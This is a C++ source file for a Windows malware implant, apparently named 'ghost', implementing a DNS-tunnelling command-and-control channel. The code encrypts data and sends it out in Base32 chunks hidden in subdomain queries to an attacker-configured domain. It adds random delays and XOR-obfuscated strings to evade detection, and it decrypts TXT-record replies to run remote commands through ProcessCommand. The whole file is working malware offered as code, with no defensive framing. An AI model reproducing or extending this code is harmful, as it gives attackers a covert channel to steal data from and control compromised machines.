#include "c2.h"
#include "../core/ghost_core.h"
#include "../core/config.h"
#include "../crypto/crypto.h"
#include <windows.h>
#include <windns.h>
#include <vector>
#include <string>
#include <random>
#include <chrono>
#include <thread>
#include <algorithm>

#pragma comment(lib, "dnsapi.lib")

namespace ghost {
namespace c2 {

namespace {

    template <size_t N>
    class ObfuscatedAString {
        char m_data[N];
        char m_key;
    public:
        constexpr ObfuscatedAString(const char (&str)[N], char key) : m_data{0}, m_key(key) {
            for (size_t i = 0; i < N; ++i) m_data[i] = str[i] ^ key;
        }
        std::string decrypt() const {
            std::string result(N - 1, '\0');
            for (size_t i = 0; i < N - 1; ++i) result[i] = m_data[i] ^ m_key;
            return result;
        }
    };
    #define OBF_A(str) ObfuscatedAString<sizeof(str)/sizeof(char)>(str, 'K').decrypt()

    std::string WStringToString(const std::wstring& wstr) {
        if (wstr.empty()) return std::string();
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
        std::string strTo(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
        return strTo;
    }

    constexpr size_t MAX_DNS_CHUNK_SIZE = 140; 
    constexpr size_t MIN_DNS_CHUNK_SIZE = 80;  
    constexpr int MAX_DNS_RETRIES = 3;         
    constexpr int MIN_DELAY_MS = 500;          
    constexpr int MAX_DELAY_MS = 2500;         

    int GetRandomInt(int min, int max) {
        static std::random_device rd;
        static std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(min, max);
        return dis(gen);
    }

    std::string Base32Encode(const uint8_t* data, size_t len) {
        std::string alphabet = OBF_A("ABCDEFGHIJKLMNOPQRSTUVWXYZ234567");
        std::string result;
        result.reserve(((len + 4) / 5) * 8);

        uint32_t buffer = 0;
        int bits = 0;

        for (size_t i = 0; i < len; ++i) {
            buffer = (buffer << 8) | data[i];
            bits += 8;

            while (bits >= 5) {
                bits -= 5;
                result += alphabet[(buffer >> bits) & 0x1F];
            }
        }

        if (bits > 0) {
            buffer <<= (5 - bits);
            result += alphabet[buffer & 0x1F];
        }

        return result;
    }

    std::vector<uint8_t> Base32Decode(const std::string& encoded) {
        std::vector<uint8_t> result;
        result.reserve((encoded.size() * 5) / 8);

        uint32_t buffer = 0;
        int bits = 0;

        for (char c : encoded) {
            uint8_t val;
            if (c >= 'A' && c <= 'Z') val = c - 'A';
            else if (c >= '2' && c <= '7') val = c - '2' + 26;
            else continue; 

            buffer = (buffer << 5) | val;
            bits += 5;

            if (bits >= 8) {
                bits -= 8;
                result.push_back((buffer >> bits) & 0xFF);
            }
        }

        return result;
    }

    std::string GenerateSubdomainPrefix() {
        std::string alphanum = OBF_A("abcdefghijklmnopqrstuvwxyz0123456789");
        int length = GetRandomInt(6, 10);
        std::string prefix;
        prefix.reserve(length);
        for (int i = 0; i < length; ++i) {
            prefix += alphanum[GetRandomInt(0, (int)alphanum.length() - 1)];
        }
        return prefix;
    }

} 

bool SendDNSTunnel(const uint8_t* data, size_t len) {
    if (len == 0) return true;

    std::vector<uint8_t> encrypted;
    if (!crypto::Encrypt(data, len, encrypted)) {
        OutputDebugStringA(OBF_A("[C2] Failed to encrypt data before DNS tunneling.\n").c_str()); 
        return false;
    }

    size_t offset = 0;
    std::vector<std::string> chunks;

    while (offset < encrypted.size()) {
        size_t random_chunk_size = (size_t)GetRandomInt(MIN_DNS_CHUNK_SIZE, MAX_DNS_CHUNK_SIZE);
        size_t this_chunk = (std::min)(random_chunk_size, encrypted.size() - offset);
        
        std::string encoded = Base32Encode(encrypted.data() + offset, this_chunk);
        chunks.push_back(encoded);
        offset += this_chunk;
    }

    std::string dns_base = WStringToString(config::C2_DNS_BASE);
    std::string dns_tld = WStringToString(config::C2_DNS_TLD);

    for (size_t i = 0; i < chunks.size(); ++i) {
        std::string subdomain = GenerateSubdomainPrefix() + "." + dns_base + "." + dns_tld;
        std::string query_name = std::to_string(i) + "-" + std::to_string(chunks.size()) + "." + subdomain;

        bool chunk_success = false;
        int retries = 0;

        while (retries < MAX_DNS_RETRIES && !chunk_success) {
            int delay = GetRandomInt(MIN_DELAY_MS, MAX_DELAY_MS);
            std::this_thread::sleep_for(std::chrono::milliseconds(delay));

            PDNS_RECORDA pQueryResults = nullptr;
            
            DNS_STATUS status = DnsQuery_A(query_name.c_str(), DNS_TYPE_TEXT, DNS_QUERY_STANDARD, nullptr,
                                           (PDNS_RECORD*)&pQueryResults, nullptr);

            if (status == ERROR_SUCCESS && pQueryResults) {
                chunk_success = true; 

                for (PDNS_RECORDA pRecord = pQueryResults; pRecord; pRecord = pRecord->pNext) {
                    if (pRecord->wType == DNS_TYPE_TEXT && pRecord->Data.TXT.pStringArray) {
                        std::string reply = pRecord->Data.TXT.pStringArray[0];
                        std::vector<uint8_t> decoded = Base32Decode(reply);
                        std::vector<uint8_t> decrypted;
                        if (crypto::Decrypt(decoded.data(), decoded.size(), decrypted)) {
                            ProcessCommand(decrypted.data(), decrypted.size());
                        }
                    }
                }
                DnsRecordListFree((PDNS_RECORD)pQueryResults, DnsFreeRecordList);
            } else {
                retries++;
                std::string log_msg = OBF_A("[C2] DNS Query failed. Retrying ") + std::to_string(retries) + OBF_A("\n");
                OutputDebugStringA(log_msg.c_str());
            }
        }

        if (!chunk_success) {
            OutputDebugStringA(OBF_A("[C2] Fatal: Failed to send chunk after max retries. Aborting tunnel.\n").c_str());
            return false;
        }
    }

    return true;
}

} 
}